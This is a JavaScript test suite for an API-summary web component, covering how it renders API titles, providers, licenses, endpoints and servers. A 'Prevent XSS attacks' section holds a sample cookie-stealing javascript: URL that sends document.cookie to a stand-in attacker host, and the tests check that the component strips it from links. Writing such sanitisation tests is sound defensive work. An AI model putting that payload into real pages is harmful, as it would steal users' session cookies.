import { fixture, assert, nextFrame, html, aTimeout } from '@open-wc/testing';
import sinon from 'sinon';
import { endpointsValue } from '../../src/elements/ApiSummaryElement.js';
import { AmfLoader } from '../AmfLoader.js';
import '../../define/api-summary.js';
import { EventTypes } from '../../src/events/EventTypes.js';
import { DomEventsAmfStore } from '../../src/store/DomEventsAmfStore.js';

/** @typedef {import('../../').ApiSummaryElement} ApiSummaryElement */
/** @typedef {import('../../src/helpers/amf').AmfDocument} AmfDocument */
/** @typedef {import('../../src/helpers/amf').DomainElement} DomainElement */
/** @typedef {import('../../src/events/NavigationEvents').ApiNavigationEvent} ApiNavigationEvent */

describe('ApiSummaryElement', () => {
  const loader = new AmfLoader();
  const store = new DomEventsAmfStore(window);
  store.listen();

  /**
   * @returns {Promise<ApiSummaryElement>}
   */
  async function modelFixture() {
    const element = await fixture(html`<api-summary 
      .queryDebouncerTimeout="${0}"
    ></api-summary>`);
    await aTimeout(1);
    return /** @type ApiSummaryElement */ (element);
  }

  describe('Basic', () => {
    /** @type AmfDocument */
    let model;
    before(async () => {
      model = await loader.getGraph();
      store.amf = model;
    });

    /** @type ApiSummaryElement */
    let element;
    beforeEach(async () => {
      element = await modelFixture();
    });

    it('renders api title', () => {
      const node = element.shadowRoot.querySelector('[role="heading"]');
      assert.dom.equal(node, `<div aria-level="2" class="api-title" role="heading" part="api-title">
        <label part="api-title-label">
          API title:
        </label>
        <span class="text-selectable">
          API body demo
        </span>
      </div>`);
    });

    it('renders version', () => {
      const node = element.shadowRoot.querySelector('.inline-description.version span');
      assert.dom.equal(node, '<span class="text-selectable">v1</span>');
    });

    it('renders protocols', () => {
      const node = element.shadowRoot.querySelector('.protocol-chips');
      assert.dom.equal(
        node,
        `<div class="protocol-chips">
        <span class="chip text-selectable">
            HTTP
        </span>
        <span class="chip text-selectable">
          HTTPS
        </span>
      </div>`
      );
    });

    it('renders description', () => {
      const node = element.shadowRoot.querySelector('arc-marked .markdown-body');
      const content = node.innerHTML.trim();
      assert.ok(content, 'has description');
      const strong = node.querySelector('strong');
      assert.dom.equal(
        strong,
        '<strong>markdown</strong>',
        { ignoreAttributes: ['class'] },
      );
      const anchor = node.querySelector('a');
      assert.dom.equal(
        anchor,
        '<a>evil markdown</a>',
        { ignoreAttributes: ['class'] },
      );
    });

    it('renders base uri', () => {
      const node = element.shadowRoot.querySelector('.url-value');
      assert.equal(node.textContent.trim(), `http://{instance}.domain.com`);
    });

    it('renders endpoints template', () => {
      const node = element.shadowRoot.querySelector('.endpoints-title');
      assert.dom.equal(node, `<label class="endpoints-title section">API endpoints</label>`);
    });
  });

  describe('OAS properties', () => {
    /** @type AmfDocument */
    let model;
    before(async () => {
      model = await loader.getGraph('loan-microservice');
      store.amf = model;
    });

    /** @type ApiSummaryElement */
    let element;
    beforeEach(async () => {
      element = await modelFixture();
    });
    

    it('provider section is rendered', () => {
      const node = element.shadowRoot.querySelector('[role="contentinfo"]');
      assert.ok(node);
    });

    it('renders provider name', () => {
      const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-name');
      assert.dom.equal(node, `<span class="provider-name text-selectable">John Becker</span>`);
    });

    it('renders provider email', () => {
      const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-email');
      assert.dom.equal(
        node,
        `<a class="app-link link-padding provider-email text-selectable" href="mailto:JohnBecker@cognizant.com">
        JohnBecker@cognizant.com
      </a>`
      );
    });

    it('renders provider url', () => {
      const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-url');
      assert.dom.equal(
        node,
        `<a class="app-link provider-url text-selectable" href="http://domain.com" target="_blank">http://domain.com</a>`
      );
    });

    it('renders license region', () => {
      const node = element.shadowRoot.querySelector('[aria-labelledby="licenseLabel"]');
      assert.ok(node);
    });

    it('renders license link', () => {
      const node = element.shadowRoot.querySelector('[aria-labelledby="licenseLabel"] a');
      assert.dom.equal(
        node,
        `<a class="app-link text-selectable" href="https://www.apache.org/licenses/LICENSE-2.0.html" target="_blank">
        Apache 2.0
      </a>`
      );
    });

    it('Renders ToS region', () => {
      const node = element.shadowRoot.querySelector('[aria-labelledby="tocLabel"]');
      assert.ok(node);
    });
  });

  describe('Prevent XSS attacks', () => {
    /** @type AmfDocument */
    let model;
    before(async () => {
      model = await loader.getGraph('prevent-xss');
      store.amf = model;
    });

    /** @type ApiSummaryElement */
    let element;
    beforeEach(async () => {
      element = await modelFixture();
    });

    it('provider section is rendered', () => {
      const node = element.shadowRoot.querySelector('[role="contentinfo"]');
      assert.ok(node);
    });

    it('renders provider name', () => {
      const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-name');
      assert.dom.equal(node, `<span class="provider-name text-selectable">Wally</span>`);
    });

    it('renders provider email', () => {
      const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-email');
      assert.dom.equal(
        node,
        `<a class="app-link link-padding provider-email text-selectable" href="mailto:wallythebest@wally.com">
        wallythebest@wally.com
      </a>`
      );
    });

    it('renders provider url without malicious href', () => {
      const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-url');
      assert.dom.equal(
        node,
        `<a class="app-link provider-url text-selectable" target="_blank">
          javascript:window.location='http://attacker/?cookie='+document.cookie</a>`
      );
    });

    it('renders license region', () => {
      const node = element.shadowRoot.querySelector('[aria-labelledby="licenseLabel"]');
      assert.ok(node);
    });

    it('renders license without malicious href', () => {
      const node = element.shadowRoot.querySelector('[aria-labelledby="licenseLabel"] a');
      assert.dom.equal(
        node,
        `<a class="app-link text-selectable" target="_blank">
        I swear if you click below you will have the most amazing experience ever. I promise.
      </a>`
      );
    });

    it('Renders ToS region', () => {
      const node = element.shadowRoot.querySelector('[aria-labelledby="tocLabel"]');
      assert.ok(node);
    });
  });

  describe('Endpoints rendering', () => {
    /** @type AmfDocument */
    let model;
    before(async () => {
      model = await loader.getGraph();
      store.amf = model;
    });

    /** @type ApiSummaryElement */
    let element;
    beforeEach(async () => {
      element = await modelFixture();
    });

    it('adds separator', () => {
      const node = element.shadowRoot.querySelector('.separator');
      assert.ok(node);
    });

    it('renders all endpoints', () => {
      const nodes = element.shadowRoot.querySelectorAll('.endpoint-item');
      assert.lengthOf(nodes, 72);
    });

    it('renders endpoint name', () => {
      const node = element.shadowRoot.querySelectorAll('.endpoint-item')[2].querySelector('.endpoint-path');
      assert.dom.equal(
        node,
        `<a
          class="endpoint-path text-selectable"
          data-shape-type="resource"
          href="#/people"
          title="Open endpoint documentation"
          >
          People
        </a>`,
        {
          ignoreAttributes: ['data-id']
        }
      );
    });

    it('sets data-id on name', () => {
      const node = element.shadowRoot.querySelectorAll('.endpoint-item')[2].querySelector('.endpoint-path');
      assert.ok(node.getAttribute('data-id'));
    });

    it('renders endpoint path with name', () => {
      const node = element.shadowRoot.querySelectorAll('.endpoint-item')[2].querySelector('.endpoint-path-name');
      assert.dom.equal(node, `<p class="endpoint-path-name">/people</p>`, {
        ignoreAttributes: ['data-id']
      });
    });

    it('sets data-id on path', () => {
      const node = element.shadowRoot.querySelectorAll('.endpoint-item')[2].querySelector('.endpoint-path');
      assert.ok(node.getAttribute('data-id'));
    });

    it('renders list of operations', () => {
      const nodes = element.shadowRoot.querySelectorAll('.endpoint-item')[2].querySelectorAll('.method-label');
      assert.lengthOf(nodes, 4);
    });

    it('renders an operation', () => {
      const node = element.shadowRoot.querySelectorAll('.endpoint-item')[2].querySelector('.method-label');
      assert.dom.equal(
        node,
        `<a
          class="method-label"
          data-method="get"
          data-shape-type="operation"
          href="#/people/get"
          title="Open method documentation"
          >get</a>`,
        {
          ignoreAttributes: ['data-id', 'data-parent']
        }
      );
    });

    it('dispatches the navigation event from the endpoint node', () => {
      const spy = sinon.spy();
      element.addEventListener(EventTypes.Navigation.apiNavigate, spy);

      const node = element.shadowRoot.querySelector(`.endpoint-path[data-id]`);
      /** @type HTMLElement */ (node).click();

      assert.isTrue(spy.calledOnce, 'the event is dispatched');
      const e = /** @type ApiNavigationEvent */ (spy.args[0][0]);
      const { detail } = e;
      assert.typeOf(detail.domainId, 'string');
      assert.equal(detail.domainType, 'resource');
    });

    it('dispatches the navigation event from the endpoint path', () => {
      const spy = sinon.spy();
      element.addEventListener(EventTypes.Navigation.apiNavigate, spy);

      const node = element.shadowRoot.querySelector(`.endpoint-path[data-id]`);
      /** @type HTMLElement */ (node).click();

      assert.isTrue(spy.calledOnce, 'the event is dispatched');
      const e = /** @type ApiNavigationEvent */ (spy.args[0][0]);
      const { detail } = e;
      assert.typeOf(detail.domainId, 'string');
      assert.equal(detail.domainType, 'resource');
    });

    it('dispatches the navigation event from the operation click', () => {
      const spy = sinon.spy();
      element.addEventListener(EventTypes.Navigation.apiNavigate, spy);

      const node = element.shadowRoot.querySelector(`.method-label[data-id]`);
      /** @type HTMLElement */ (node).click();

      assert.isTrue(spy.calledOnce, 'the event is dispatched');
      const e = /** @type ApiNavigationEvent */ (spy.args[0][0]);
      const { detail } = e;
      assert.typeOf(detail.domainId, 'string');
      assert.equal(detail.domainType, 'operation');
    });
  });

  describe('Server rendering', () => {
    /** @type AmfDocument */
    let ramlSingleServerAmf;
    /** @type AmfDocument */
    let oasMultipleServersAmf;
    /** @type AmfDocument */
    let oasMultipleServersWithDescriptionAmf;
    /** @type AmfDocument */
    let noServersAmf;
    before(async () => {
      ramlSingleServerAmf = await loader.getGraph();
      oasMultipleServersAmf = await loader.getGraph('multi-server');
      oasMultipleServersWithDescriptionAmf = await loader.getGraph('APIC-641');
      noServersAmf = await loader.getGraph('no-server');
    });

    it('renders URL area with a single server', async () => {
      store.amf = ramlSingleServerAmf;
      const element = await modelFixture();
      const node = element.shadowRoot.querySelector('.endpoint-url');
      assert.ok(node);
    });

    it('renders single server URL', async () => {
      store.amf = ramlSingleServerAmf;
      const element = await modelFixture();
      const node = element.shadowRoot.querySelector('.url-value');
      assert.equal(node.textContent.trim(), 'http://{instance}.domain.com');
    });

    it('renders multiple servers', async () => {
      store.amf = oasMultipleServersAmf;
      const element = await modelFixture();
      const node = element.shadowRoot.querySelector('.servers');
      assert.ok(node);
    });

    it('renders multiple URLs', async () => {
      store.amf = oasMultipleServersAmf;
      const element = await modelFixture();
      const nodes = element.shadowRoot.querySelectorAll('.server-lists li');
      assert.lengthOf(nodes, 4, 'has 4 servers');
      assert.equal(nodes[0].textContent.trim(), 'https://{customerId}.saas-app.com:{port}/v2');
      assert.equal(nodes[1].textContent.trim(), 'https://{region}.api.cognitive.microsoft.com');
      assert.equal(nodes[2].textContent.trim(), 'https://api.openweathermap.org/data/2.5');
      assert.equal(nodes[3].textContent.trim(), 'http://beta.api.openweathermap.org/data/2.5');
    });

    it('does not render URL area when no servers', async () => {
      store.amf = noServersAmf;
      const element = await modelFixture();
      const urlNode = element.shadowRoot.querySelector('.url-area');
      assert.notOk(urlNode);
      const serversNode = element.shadowRoot.querySelector('.servers');
      assert.notOk(serversNode);
    });

    it('renders multiple URLs with descriptions', async () => {
      store.amf = oasMultipleServersWithDescriptionAmf;
      const element = await modelFixture();
      const nodes = element.shadowRoot.querySelectorAll('.server-lists li');
      assert.lengthOf(nodes, 4, 'has 4 servers');
      assert.equal(nodes[0].textContent.trim(), 'https://api.aws-west-prd.capgroup.com/cdp-proxy/profiles');
      assert.equal(nodes[0].querySelector('arc-marked').markdown, 'MuleSoft PROD');
      assert.equal(nodes[1].textContent.trim(), 'https://api.aws-west-snp.capgroup.com/cdp-proxy-e2e/profiles');
      assert.equal(nodes[1].querySelector('arc-marked').markdown, 'MuleSoft UAT (for enterprise consumers)');
      assert.equal(nodes[2].textContent.trim(), 'https://api.aws-west-oz.capgroup.com/cdp-proxy-ite2/profiles');
      assert.equal(nodes[2].querySelector('arc-marked').markdown, 'MuleSoft QA (for enterprise consumers)');
      assert.equal(nodes[3].textContent.trim(), 'https://api.aws-west-oz.capgroup.com/cdp-proxy-dev2/profiles');
      assert.notOk(nodes[3].querySelector('arc-marked'));
    });
  });

  describe('AsyncAPI', () => {
    before(async () => {
      const model = await loader.getGraph('async-api');
      store.amf = model;
    });

    /** @type ApiSummaryElement */
    let element;
    beforeEach(async () => {
      element = await modelFixture();
    });

    it('renders server uri for API', () => {
      const node = element.shadowRoot.querySelector('.url-value');
      assert.equal(node.textContent.trim(), 'amqp://broker.mycompany.com');
    });

    it('renders "API channels" message', () => {
      assert.equal(element.shadowRoot.querySelector('.section.endpoints-title').textContent, 'API channels');
    });
  });

  describe('hideToc', () => {
    before(async () => {
      const model = await loader.getGraph();
      store.amf = model;
    });

    /** @type ApiSummaryElement */
    let element;
    beforeEach(async () => {
      element = await modelFixture();
      element.setAttribute('hideToc', 'true');
      await nextFrame();
    });

    it('does not render endpoints template', () => {
      const node = element.shadowRoot.querySelector('.toc');
      assert.isNull(node);
    });
  });

  describe('Rendering for library', () => {
    /** @type AmfDocument */
    let libraryModel;
    /** @type AmfDocument */
    let apiModel;
    before(async () => {
      libraryModel = await loader.getGraph('APIC-711');
      apiModel = await loader.getGraph();
      store.amf = apiModel;
    });

    /** @type ApiSummaryElement */
    let element;
    beforeEach(async () => {
      element = await modelFixture();
    });

    it('clears everything when changing to RAML library', async () => {
      store.amf = libraryModel;
      await aTimeout(2);
      assert.notOk(element.summary);
      assert.deepEqual(element.servers, []);
      assert.deepEqual(element[endpointsValue], []);
    });
  });

  describe('a11y', () => {
    before(async () => {
      const model = await loader.getGraph('loan-microservice');
      store.amf = model;
    });

    /** @type ApiSummaryElement */
    let element;
    beforeEach(async () => {
      element = await modelFixture();
    });

    it('passes accessibility test', async () => {
      await assert.isAccessible(element, {
        ignoredRules: ['color-contrast']
      });
    });
  });
});
